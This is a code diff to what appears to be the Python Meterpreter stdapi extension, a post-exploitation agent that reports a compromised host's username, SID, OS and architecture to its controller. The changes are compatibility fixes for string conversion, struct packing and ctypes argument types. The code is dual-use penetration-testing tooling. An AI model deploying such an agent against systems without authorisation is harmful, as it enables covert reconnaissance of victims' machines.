@@ -59,10 +59,10 @@ if sys.version_info[0] < 3:
 else:
 	if isinstance(__builtins__, dict):
 		is_str = lambda obj: issubclass(obj.__class__, __builtins__['str'])
-		str = lambda x: __builtins__['str'](x, 'UTF-8')
+		str = lambda x: __builtins__['str'](x, *(() if isinstance(x, (float, int)) else ('UTF-8',)))
 	else:
 		is_str = lambda obj: issubclass(obj.__class__, __builtins__.str)
-		str = lambda x: __builtins__.str(x, 'UTF-8')
+		str = lambda x: __builtins__.str(x, *(() if isinstance(x, (float, int)) else ('UTF-8',)))
 	is_bytes = lambda obj: issubclass(obj.__class__, bytes)
 	NULL_BYTE = bytes('\x00', 'UTF-8')
 	long = int
@@ -566,7 +566,7 @@ def get_stat_buffer(path):
 	blocks = 0
 	if hasattr(si, 'st_blocks'):
 		blocks = si.st_blocks
-	st_buf = struct.pack('<IHHH', si.st_dev, min(0xffff, si.st_ino), si.st_mode, si.st_nlink)
+	st_buf = struct.pack('<IHHH', si.st_dev, max(min(0xffff, si.st_ino), 0), si.st_mode, si.st_nlink)
 	st_buf += struct.pack('<HHHI', si.st_uid & 0xffff, si.st_gid & 0xffff, 0, rdev)
 	st_buf += struct.pack('<IIII', si.st_size, long(si.st_atime), long(si.st_mtime), long(si.st_ctime))
 	st_buf += struct.pack('<II', blksize, blocks)
@@ -598,7 +598,9 @@ def get_username_from_token(token_user):
 	domain_len.value = ctypes.sizeof(domain)
 	use = ctypes.c_ulong()
 	use.value = 0
-	if not ctypes.windll.advapi32.LookupAccountSidA(None, token_user.User.Sid, user, ctypes.byref(user_len), domain, ctypes.byref(domain_len), ctypes.byref(use)):
+	LookupAccountSid = ctypes.windll.advapi32.LookupAccountSidA
+	LookupAccountSid.argtypes = [ctypes.c_void_p] * 7
+	if not LookupAccountSid(None, token_user.User.Sid, user, ctypes.byref(user_len), domain, ctypes.byref(domain_len), ctypes.byref(use)):
 		return None
 	return str(ctypes.string_at(domain)) + '\\' + str(ctypes.string_at(user))
 
@@ -803,7 +805,9 @@ def stdapi_sys_config_getsid(request, response):
 	if not token:
 		return error_result_windows(), response
 	sid_str = ctypes.c_char_p()
-	if not ctypes.windll.advapi32.ConvertSidToStringSidA(token.User.Sid, ctypes.byref(sid_str)):
+	ConvertSidToStringSid = ctypes.windll.advapi32.ConvertSidToStringSidA
+	ConvertSidToStringSid.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
+	if not ConvertSidToStringSid(token.User.Sid, ctypes.byref(sid_str)):
 		return error_result_windows(), response
 	sid_str = str(ctypes.string_at(sid_str))
 	response += tlv_pack(TLV_TYPE_SID, sid_str)
@@ -837,27 +841,17 @@ def stdapi_sys_config_localtime(request, response):
 def stdapi_sys_config_sysinfo(request, response):
 	uname_info = platform.uname()
 	response += tlv_pack(TLV_TYPE_COMPUTER_NAME, uname_info[1])
-	arch = uname_info[4]
 	os_name = uname_info[0] + ' ' + uname_info[2] + ' ' + uname_info[3]
 	lang = None
 	if 'LANG' in os.environ:
 		lang = os.environ['LANG'].split('.', 1)[0]
 	if has_windll:
-		arch = windll_GetNativeSystemInfo()
-		if arch == PROCESS_ARCH_IA64:
-			arch = 'IA64'
-		elif arch == PROCESS_ARCH_X64:
-			arch = 'x86_64'
-		elif arch == PROCESS_ARCH_X86:
-			arch = 'x86'
-		else:
-			arch = uname_info[4]
 		os_name = get_windll_os_name() or os_name
 		lang = (get_windll_lang() or lang)
 	if lang:
 		response += tlv_pack(TLV_TYPE_LANG_SYSTEM, lang)
 	response += tlv_pack(TLV_TYPE_OS_NAME, os_name)
-	response += tlv_pack(TLV_TYPE_ARCHITECTURE, arch)
+	response += tlv_pack(TLV_TYPE_ARCHITECTURE, get_system_arch())
 	return ERROR_SUCCESS, response
 
 @meterpreter.register_function
